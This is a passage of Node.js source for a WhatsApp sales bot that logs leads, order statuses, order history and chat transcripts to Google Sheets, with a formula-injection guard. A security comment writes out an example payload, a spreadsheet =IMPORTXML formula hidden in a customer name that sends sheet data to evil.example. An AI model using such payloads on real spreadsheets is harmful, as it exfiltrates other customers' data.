  // Column L (index 11) — see 'Shipping Fee Override' header comment above.
  // Blank/unparseable means "no exception", not "0 EGP" — parsePriceToNumber
  // (invoiceGenerator.js) is what turns a real 0 into an actual free-shipping
  // exception, so this must stay null/undefined rather than coerce to 0.
  const overrideRaw = row[11];
  const shippingFeeOverrideEGP = overrideRaw === undefined || overrideRaw === null || String(overrideRaw).trim() === '' ? null : overrideRaw;
  // Column M (index 12) — see 'Shipping Method' header comment above. Blank
  // (pre-existing rows, or a write that failed) reads as 'standard', the
  // same safe default used everywhere else this value is consumed.
  const shippingMethod = String(row[12] || '').trim().toLowerCase() === 'express' ? 'express' : 'standard';
  // Column N (index 13) — see 'Quantity' header comment above. Blank/
  // unparseable reads as 1, never 0 or NaN.
  const parsedQuantity = parseInt(row[13], 10);
  const quantity = Number.isInteger(parsedQuantity) && parsedQuantity > 0 ? parsedQuantity : 1;
  return { date, customerName, phone, address, products, totalPrice, shippingFeeOverrideEGP, shippingMethod, quantity };
}

// phone number lives in column C (index 2) of the Leads sheet; earliest row
// wins for a given phone so pre-existing historical duplicates (rows written
// before this upsert logic existed) consolidate onto their first row rather
// than the cache flip-flopping between them.
async function loadPhoneRowCache() {
  if (!enabled) return;
  try {
    const result = await sheetsClient.spreadsheets.values.get(
      { spreadsheetId: config.googleSheetId, range: `${LEADS_SHEET_NAME}!A2:C` },
      { timeout: REQUEST_TIMEOUT_MS }
    );
    const rows = result.data.values || [];
    const cache = new Map();
    rows.forEach((row, i) => {
      const phone = row[2];
      if (phone && !cache.has(phone)) cache.set(phone, i + 2); // +2: 1-based, past the header row
    });
    phoneRowCache = cache;
    logger.info(`Loaded ${phoneRowCache.size} existing lead row(s) from the Leads sheet for phone-number dedup.`);
  } catch (err) {
    logger.error('Could not load existing Leads rows for phone-number dedup. Leads will still be logged, just as new rows until the next successful load.', err);
  }
}

// Targeted single-cell write (Order Status only, column H) via the existing
// phone -> row cache — used when the BOT itself determines a status change
// (e.g. a customer confirming or disputing delivery), as opposed to
// appendLead's full-row upsert. Never touches any other column.
async function updateOrderStatus(phone, newStatus) {
  if (!enabled) {
    logger.warn('Google Sheets is not configured. Skipping Order Status update (WhatsApp bot continues normally).');
    return false;
  }
  const row = phoneRowCache.get(phone);
  if (!row) {
    logger.warn(`No Leads row found for ${phone} — cannot update Order Status to "${newStatus}".`);
    return false;
  }
  try {
    await sheetsClient.spreadsheets.values.update(
      {
        spreadsheetId: config.googleSheetId,
        range: `${LEADS_SHEET_NAME}!H${row}`,
        valueInputOption: 'USER_ENTERED',
        requestBody: { values: [[newStatus]] },
      },
      { timeout: REQUEST_TIMEOUT_MS }
    );
    logger.success(`Order Status updated to "${newStatus}" for ${phone} (row ${row}).`);
    return true;
  } catch (err) {
    logger.error(`Failed to update Order Status for ${phone}.`, err);
    return false;
  }
}

// Live, targeted read (Product Name..Order Status, columns E-H) for a single
// phone's Leads row — powers the "فين طلبي؟" customer-facing status lookup
// (llmAgent.js). Deliberately a fresh API call rather than a cached read:
// Order Status can change from a STAFF edit directly in the Sheet UI, which
// never flows back into the bot's own in-memory session state, so only a live read
// is guaranteed current. Returns null if there's no row for this phone yet
// (brand-new customer, never logged) or Sheets is unavailable — the caller
// treats both the same way ("no order on file").
async function getCurrentOrderStatus(phone) {
  if (!enabled) return null;
  const row = phoneRowCache.get(phone);
  if (!row) return null;
  try {
    const result = await sheetsClient.spreadsheets.values.get(
      { spreadsheetId: config.googleSheetId, range: `${LEADS_SHEET_NAME}!E${row}:H${row}` },
      { timeout: REQUEST_TIMEOUT_MS }
    );
    const values = (result.data.values && result.data.values[0]) || [];
    return {
      productName: values[0] || '',
      deliveryAddress: values[2] || '',
      orderStatus: values[3] || '',
    };
  } catch (err) {
    logger.error(`Failed to read live order status for ${phone}.`, err);
    return null;
  }
}

// Builds phone -> [{date, timestamp, productName, price}, ...] (most-recent
// first) from every row in Order History. Unlike loadPhoneRowCache, this
// keeps every row per phone (not just one), since the whole point is a full
// purchase history, not a single current-state row.
async function loadCustomerHistoryCache() {
  if (!enabled) return;
  try {
    const result = await sheetsClient.spreadsheets.values.get(
      { spreadsheetId: config.googleSheetId, range: `${ORDER_HISTORY_SHEET_NAME}!A2:F` },
      { timeout: REQUEST_TIMEOUT_MS }
    );
    const rows = result.data.values || [];
    const cache = new Map();
    rows.forEach((row) => {
      const [date, , phone, productName, price] = row;
      if (!phone || !date) return;
      const timestamp = new Date(date).getTime();
      if (Number.isNaN(timestamp)) return;
      const entry = { date, timestamp, productName: productName || '', price: price || '' };
      const existing = cache.get(phone) || [];
      existing.push(entry);
      cache.set(phone, existing);
    });
    cache.forEach((entries) => entries.sort((a, b) => b.timestamp - a.timestamp));
    customerHistoryCache = cache;
    logger.info(`Loaded order history for ${customerHistoryCache.size} customer(s) from the Order History sheet.`);
  } catch (err) {
    logger.error('Could not load Order History for customer-memory lookups. Returning customers will not be recognized until the next successful load.', err);
  }
}

// Appends one row per completed order (never upserted) and updates the
// in-memory cache immediately, so the very next message from this customer
// — even seconds later — already reflects it without another Sheets read.
async function logOrderHistory(entry) {
  if (!enabled) {
    logger.warn('Google Sheets is not configured. Skipping order-history log (WhatsApp bot continues normally).');
    return false;
  }
  const date = entry.date || new Date().toISOString();
  const phone = entry.phone;

  // Explicit idempotency check — see ORDER_DEDUP_WINDOW_MS above.
  if (phone) {
    const nowTs = new Date(date).getTime();
    const recent = customerHistoryCache.get(phone) || [];
    const duplicate = recent.find(
      (o) =>
        o.productName === (entry.productName || '') &&
        String(o.price) === String(entry.price || '') &&
        Math.abs(nowTs - o.timestamp) < ORDER_DEDUP_WINDOW_MS
    );
    if (duplicate) {
      logger.warn(
        `Skipped duplicate Order History log for ${phone} (${entry.productName || 'unknown'}) — an identical order was already logged at ${duplicate.date}.`
      );
      return false;
    }
  }

  try {
    await sheetsClient.spreadsheets.values.append(
      {
        spreadsheetId: config.googleSheetId,
        range: `${ORDER_HISTORY_SHEET_NAME}!A:F`,
        valueInputOption: 'USER_ENTERED',
        insertDataOption: 'INSERT_ROWS',
        // See sanitizeRowForSheet's doc comment (near extractRowNumber) —
        // entry.customerName here is the same customer-controlled field as
        // appendLead's, so it needs the same formula-injection guard.
        requestBody: {
          values: [sanitizeRowForSheet([date, entry.customerName || '', phone || '', entry.productName || '', entry.price || '', entry.orderStatus || 'Completed'])],
        },
      },
      { timeout: REQUEST_TIMEOUT_MS }
    );
    if (phone) {
      const timestamp = new Date(date).getTime();
      const existing = customerHistoryCache.get(phone) || [];
      existing.unshift({ date, timestamp, productName: entry.productName || '', price: entry.price || '' });
      existing.sort((a, b) => b.timestamp - a.timestamp);
      customerHistoryCache.set(phone, existing);
    }
    logger.success(`Order history logged for ${phone} (product: ${entry.productName || 'unknown'}).`);
    return true;
  } catch (err) {
    logger.error('Failed to log order history. WhatsApp bot continues normally.', err);
    return false;
  }
}

// Pure in-memory lookup — safe to call on every message. Returns [] for a
// brand-new customer or if Sheets is disabled/hasn't loaded yet.
function getCustomerHistory(phone) {
  return customerHistoryCache.get(phone) || [];
}

// Parses a row number out of a values.append `updatedRange` like
// "Leads!A35:J35" (or the single-cell form "Leads!A35").
function extractRowNumber(updatedRange) {
  const match = /![A-Z]+(\d+)/.exec(updatedRange || '');
  return match ? parseInt(match[1], 10) : null;
}

// SECURITY (2026-07-18): rows are written with valueInputOption:'USER_ENTERED'
// (needed so the bot's own Date column and the staff-owned Follow-up Date
// round-trip stay real Sheets date values, not inert text) — but that mode
// also means a cell value starting with =, +, - or @ gets evaluated as a
// formula by Sheets/Excel. Several fields in a logged row are entirely
// customer-controlled (customerName is the WhatsApp display name — trivial
// for anyone to set to anything; deliveryAddress/notes routinely echo raw
// customer-typed text). Without this, a customer could set their WhatsApp
// name to something like =IMPORTXML("https://evil.example/x?"&A1&C1,"//a")
// and have it silently execute the moment a staff member opens the sheet —
// exfiltrating other customers' data or serving a phishing link. Prefixing a
// leading apostrophe is the standard CSV/formula-injection mitigation: it
// forces Sheets to store the value as literal text, exactly like typing '=
// directly into a cell in the Sheets UI does.
const FORMULA_TRIGGER_CHARS = new Set(['=', '+', '-', '@']);

function sanitizeForSheetCell(value) {
  if (typeof value !== 'string' || value.length === 0) return value;
  return FORMULA_TRIGGER_CHARS.has(value[0]) ? `'${value}` : value;
}

function sanitizeRowForSheet(row) {
  return row.map(sanitizeForSheetCell);
}

// 2026-07-18: the Conversation History note now holds a clean JSON array of
// {role, content} chat turns — the exact OpenAI fine-tuning message shape —
// instead of a human-readable "[timestamp] العميل: ..." text block, so the
// 2-month dataset this is building up can be exported and used for local-LLM
// fine-tuning with no manual cleanup. buildHistoryEntries turns one turn of
// a logged message into 0-2 of those {role, content} objects.
function buildHistoryEntries(entry) {
  const turns = [];
  if (entry.customerMessage) turns.push({ role: 'user', content: entry.customerMessage });
  if (entry.replyText) turns.push({ role: 'assistant', content: entry.replyText });
  return turns;
}

// Rows written before 2026-07-18 have a note in the old free-text format
// ("[timestamp] العميل: ..." / "[timestamp] سارة: ..." lines) rather than
// JSON. Parsed once, on first read, into the same {role, content} shape so
// existing customers' history carries forward into the new column format
// instead of being silently dropped the next time they message.
function parseLegacyHistoryText(text) {
  return text
    .split('\n')
    .map((line) => {
      const match = /^\[.*?\]\s(العميل|سارة):\s(.*)$/.exec(line);
      if (!match) return null;
      return { role: match[1] === 'العميل' ? 'user' : 'assistant', content: match[2] };
    })
    .filter(Boolean);
}

// Existing note (previousHistory from getExistingRowState) is either JSON
// from this format, JSON from an even older run, or legacy free text — this
// normalizes all three into a plain {role, content}[] to append new turns to.
function parseExistingHistoryEntries(noteText) {
  if (!noteText) return [];
  try {
    const parsed = JSON.parse(noteText);
    return Array.isArray(parsed) ? parsed : [];
  } catch (err) {
    return parseLegacyHistoryText(noteText);
  }
}

// Conversation History (column J, 0-indexed 9 — see the LEADS_HEADERS
// note above) used to hold the full, ever-growing chat transcript as the
// cell's VALUE — fine for a few turns, but it made rows balloon to dozens of
// lines tall over a long-running conversation and turned the sheet into a
// wall of text. Now the cell just shows a short indicator and the full
// transcript lives in the cell's Note (hover to read), keeping every row a
// single compact line while losing nothing — same data, same phone-based
// upsert/accumulation logic, just moved off the visible grid.
const CONVERSATION_HISTORY_COLUMN_INDEX = 9; // J
const HISTORY_INDICATOR_TEXT = '📄 View History';
// Google Sheets caps a cell Note at roughly 50,000 characters; stay well
// under that so a long-running conversation's note write never gets
// rejected outright — trim whole turns from the oldest end (never mid-object,
// which would produce invalid JSON) and keep the most recent (most
// operationally relevant, and most useful for training) messages.
const MAX_NOTE_LENGTH = 45000;

// String-based variant kept only for scripts/migrateHistoryToNotes.js, a
// one-time (already-applied, idempotent) migration of raw cell VALUES into
// Notes — predates the JSON-array format and operates on plain transcript
// strings, not {role, content} entries.
function truncateHistoryForNote(history) {
  if (history.length <= MAX_NOTE_LENGTH) return history;
  const marker = '...[سجل أقدم اتقطع للحفاظ على حجم الملاحظة]...\n';
  return marker + history.slice(history.length - (MAX_NOTE_LENGTH - marker.length));
}

function serializeHistoryEntries(entries) {
  let trimmed = entries;
  let serialized = JSON.stringify(trimmed);
  while (serialized.length > MAX_NOTE_LENGTH && trimmed.length > 1) {
    trimmed = trimmed.slice(1);
    serialized = JSON.stringify(trimmed);
  }
  if (trimmed.length < entries.length) {
    logger.warn(`Conversation History note exceeded ${MAX_NOTE_LENGTH} chars — dropped ${entries.length - trimmed.length} oldest turn(s).`);
  }
  return serialized;
}

// Sets (or replaces) the Note on the Conversation History cell for a given
// 1-based row number. `historyText` must already be final (e.g. the JSON
// string from serializeHistoryEntries, already truncated at the turn level)
// — this no longer truncates itself, since naively cutting mid-string would
// produce invalid JSON. Uses updateCells with fields:'note' specifically so
// it only ever touches the Note — never the cell's displayed value, which is
// written separately via the normal values.update/append calls in
// appendLead() below.
async function setConversationHistoryNote(rowNumber, historyText) {
  if (leadsSheetId === null) {
    logger.warn('Leads sheetId not resolved yet — skipping conversation-history note write this time (will retry on next message).');
    return;
  }
  await sheetsClient.spreadsheets.batchUpdate(
    {
      spreadsheetId: config.googleSheetId,
      requestBody: {
        requests: [
          {
            updateCells: {
              range: {
                sheetId: leadsSheetId,
                startRowIndex: rowNumber - 1,
                endRowIndex: rowNumber,
                startColumnIndex: CONVERSATION_HISTORY_COLUMN_INDEX,
                endColumnIndex: CONVERSATION_HISTORY_COLUMN_INDEX + 1,
              },
              rows: [{ values: [{ note: historyText }] }],
              fields: 'note',
            },
          },
        ],
      },
    },
    { timeout: REQUEST_TIMEOUT_MS }
  );
}

// Reads J's existing Note (previous conversation history, NOT its value —
// the value is just the indicator text) and K's current value (Follow-up
// Date, staff-owned, must round-trip unchanged) for a given 1-based row.
// spreadsheets.get (not values.get) is required here since values.get never
// returns Notes.
async function getExistingRowState(rowNumber) {
  // Two ranges in one call: H (Order Status — 2026-08-03, so appendLead can
  // decide whether to protect it, see GENERIC_ORDER_STATUSES) and J:L
  // (Conversation History's Note, Follow-up Date, and Staff Notes — all
  // three round-tripped unchanged the same way Follow-up Date always was).
  const result = await sheetsClient.spreadsheets.get(
    {
      spreadsheetId: config.googleSheetId,
      ranges: [`${LEADS_SHEET_NAME}!H${rowNumber}:H${rowNumber}`, `${LEADS_SHEET_NAME}!J${rowNumber}:L${rowNumber}`],
      fields: 'sheets.data.rowData.values(formattedValue,note)',
    },
    { timeout: REQUEST_TIMEOUT_MS }
  );
  const dataRanges = (result.data.sheets || [])[0]?.data || [];
  const statusCells = dataRanges[0]?.rowData?.[0]?.values || [];
  const cells = dataRanges[1]?.rowData?.[0]?.values || [];
  return {
    currentOrderStatus: (statusCells[0] && statusCells[0].formattedValue) || '',
    previousHistory: (cells[0] && cells[0].note) || '',
    followUpDate: (cells[1] && cells[1].formattedValue) || '',
    staffNotes: (cells[2] && cells[2].formattedValue) || '',
  };
}

function productToRow(product) {
  return [
    product.id || '',
    product.name || '',
    product.category || '',
    product.price || '',
    product.description || '',
    Array.isArray(product.benefits) ? product.benefits.join(', ') : '',
    Array.isArray(product.targetType) ? product.targetType.join(', ') : '',
    product.inStock === false ? 'FALSE' : 'TRUE',
  ];
}

async function ensureProductsTabSeeded() {
  try {
    await ensureHeaderRow(PRODUCTS_SHEET_NAME, PRODUCTS_HEADERS);

    const result = await sheetsClient.spreadsheets.values.get(
      { spreadsheetId: config.googleSheetId, range: `${PRODUCTS_SHEET_NAME}!A2:A2` },
      { timeout: REQUEST_TIMEOUT_MS }
    );
    const hasData = result.data.values && result.data.values.length > 0;
    if (hasData) return;

    if (!fs.existsSync(LOCAL_PRODUCTS_PATH)) return;
    const localProducts = JSON.parse(fs.readFileSync(LOCAL_PRODUCTS_PATH, 'utf-8'));
    if (!Array.isArray(localProducts) || localProducts.length === 0) return;

    const rows = localProducts.map(productToRow);
    await sheetsClient.spreadsheets.values.append(
      {
        spreadsheetId: config.googleSheetId,
        range: `${PRODUCTS_SHEET_NAME}!A:H`,
        valueInputOption: 'RAW',
        insertDataOption: 'INSERT_ROWS',
        requestBody: { values: rows },
      },
      { timeout: REQUEST_TIMEOUT_MS }
    );
    logger.success(`Seeded "Products" tab with ${rows.length} starter products from products.json.`);
  } catch (err) {
    logger.error('Could not seed "Products" tab with starter data.', err);
  }
}

// One row per phone number: updates the existing row (accumulating the full
// conversation into the Conversation History column) if this phone has
// written before, otherwise appends a new row and remembers it for next time.
async function appendLead(entry) {
  if (!enabled) {
    logger.warn('Google Sheets is not configured. Skipping lead log (WhatsApp bot continues normally).');
    return false;
  }

  const phone = entry.customerPhone;
  const newTurns = buildHistoryEntries(entry);

  // A..I — matches LEADS_HEADERS order exactly (Alternative Phone sits right
  // after the phone column, Delivery Address right before Order Status, per
  // the store owner's explicit layout request; Customer Message has no
  // column of its own anymore — still captured per-message in the
  // Conversation History note via buildHistoryEntries above).
  // sanitizeRowForSheet guards every field here in one place rather than
  // trusting a per-field judgment about which ones are "customer-controlled
  // today" — cheap, and immune to a future change elsewhere quietly making a
  // currently-safe field (e.g. productName) attacker-influenced. Order
  // Status (index 7) is built separately per-branch below — the existing-row
  // branch needs the sheet's current value first to decide whether to
  // protect it (see GENERIC_ORDER_STATUSES).
  function buildRow(orderStatus) {
    return sanitizeRowForSheet([
      new Date().toISOString(),
      entry.customerName || '',
      phone || '',
      entry.altPhone || '',
      entry.productName || '',
      entry.customerNeed || '',
      entry.deliveryAddress || '',
      orderStatus,
      entry.notes || '',
    ]);
  }

  const existingRow = phoneRowCache.get(phone);

  try {
    await runLimited('sheets', config.sheetsConcurrency, async () => {
      if (existingRow) {
        // Read H (Order Status), K (Follow-up Date), and L (Staff Notes —
        // all staff-owned or protected, must round-trip unchanged) and J's
        // existing Note (previous conversation history) so the update below
        // can't blank any of them out, and so the new line accumulates onto
        // the full history rather than replacing it.
        const { previousHistory, followUpDate, staffNotes, currentOrderStatus } = await sheetsCall(() => getExistingRowState(existingRow));
        const combinedTurns = [...parseExistingHistoryEntries(previousHistory), ...newTurns];

        // 2026-08-03 fix: resolveEarlyStageOrderStatus (sessionLogHelpers.js,
        // used for every ordinary conversation turn with no specific
        // order-related event) recomputes a generic Pending/In Progress
        // status fresh every single time, with no regard for what's already
        // on the sheet — silently regressing a more specific status (staff-
        // typed, e.g. "Delivered"/"Out for Delivery" from
        // formatLeadsSheet.js's dropdown, or the bot's own earlier
        // Completed/Cancelled/Needs Specialist/Issue) back to a generic
        // default the moment the same customer sends any further message.
        // Only the generic recompute needs guarding here — an explicit,
        // specific status the bot writes deliberately for a real event
        // always represents new information and should always win.
        const finalOrderStatus =
          GENERIC_ORDER_STATUSES.has(entry.orderStatus) && currentOrderStatus && !GENERIC_ORDER_STATUSES.has(currentOrderStatus)
            ? currentOrderStatus
            : entry.orderStatus || '';
        const row = buildRow(finalOrderStatus);

        await sheetsCall(() =>
          sheetsClient.spreadsheets.values.update(
            {
              spreadsheetId: config.googleSheetId,
              range: `${LEADS_SHEET_NAME}!A${existingRow}:L${existingRow}`,
              valueInputOption: 'USER_ENTERED',
              requestBody: { values: [[...row, HISTORY_INDICATOR_TEXT, followUpDate, staffNotes]] },
            },
            { timeout: REQUEST_TIMEOUT_MS }
          )
        );
        await sheetsCall(() => setConversationHistoryNote(existingRow, serializeHistoryEntries(combinedTurns)));
        logger.success(`Google Sheet row updated for ${phone} (status: ${finalOrderStatus}).`);
      } else {
        const row = buildRow(entry.orderStatus || '');
        const appendResult = await sheetsCall(() =>
          sheetsClient.spreadsheets.values.append(
            {
              spreadsheetId: config.googleSheetId,
              range: `${LEADS_SHEET_NAME}!A:L`,
              valueInputOption: 'USER_ENTERED',
              insertDataOption: 'INSERT_ROWS',
              requestBody: { values: [[...row, HISTORY_INDICATOR_TEXT, '', '']] },
            },
            { timeout: REQUEST_TIMEOUT_MS }
          )
        );
        const newRowNumber = extractRowNumber(appendResult.data.updates && appendResult.data.updates.updatedRange);
        if (newRowNumber) {
          phoneRowCache.set(phone, newRowNumber);
          await sheetsCall(() => setConversationHistoryNote(newRowNumber, serializeHistoryEntries(newTurns)));
        }
        logger.success(`Google Sheet log saved for ${phone} (status: ${entry.orderStatus}).`);
      }
    });
    recordSuccess();
    return true;
  } catch (err) {
    logger.error('Failed to write row to Google Sheet. WhatsApp bot continues normally.', err);
    return false;
  }
}

function isEnabled() {
  return enabled;
}

function getClient() {
  return enabled ? sheetsClient : null;
}

module.exports = {
  init,
  appendLead,
  logOrderHistory,
  getCustomerHistory,
  updateOrderStatus,
  getCurrentOrderStatus,
  isEnabled,
  getClient,
  sheetsCall,
  recordSuccess,
  getLastSuccessAt,
  isStale,
  startStalenessMonitor,
  PRODUCTS_SHEET_NAME,
  LEADS_SHEET_NAME,
  ORDER_HISTORY_SHEET_NAME,
  REQUEST_TIMEOUT_MS,
  CONVERSATION_HISTORY_COLUMN_INDEX,
  HISTORY_INDICATOR_TEXT,
  truncateHistoryForNote,
  buildHistoryEntries,
  parseExistingHistoryEntries,
  serializeHistoryEntries,
  sanitizeForSheetCell,
  sanitizeRowForSheet,
  TARGETED_CLIENTS_SHEET_NAME,
  OFFERS_CAMPAIGN_SHEET_NAME,
  CONFIRMED_ORDERS_SHEET_NAME,
  getOffersCampaignRows,
  clearOfferTestTrigger,
  setOfferLastTestSentAt,
  setLastCampaignTickAt,
  getTargetedClientsRows,
  upsertTargetedClient,
  appendConfirmedOrder,
  attachInvoiceLinks,
  getConfirmedOrderByRow,
  initializeOrderPipelineColumns,
  getConfirmedOrdersPipelineRows,
  markInvoiceSent,
  setConfirmationStatus,
  setOrderStatus,
  setShippingFeeOverride,
  setTotalPrice,
  updateConfirmedOrderItems,
  appendFeedback,
  formatOffersCampaignTable,
  formatTargetedClientsTab,
  formatConfirmedOrdersTab,
  formatFeedbackTab,
  TRUSTED_CLIENTS_SHEET_NAME,
  TRUSTED_CLIENTS_HEADERS,
  getTrustedClientsRows,
  upsertTrustedClient,
  computeCustomerTier,
  UNLISTED_PRODUCT_REQUESTS_SHEET_NAME,
  appendUnlistedProductRequest,
};
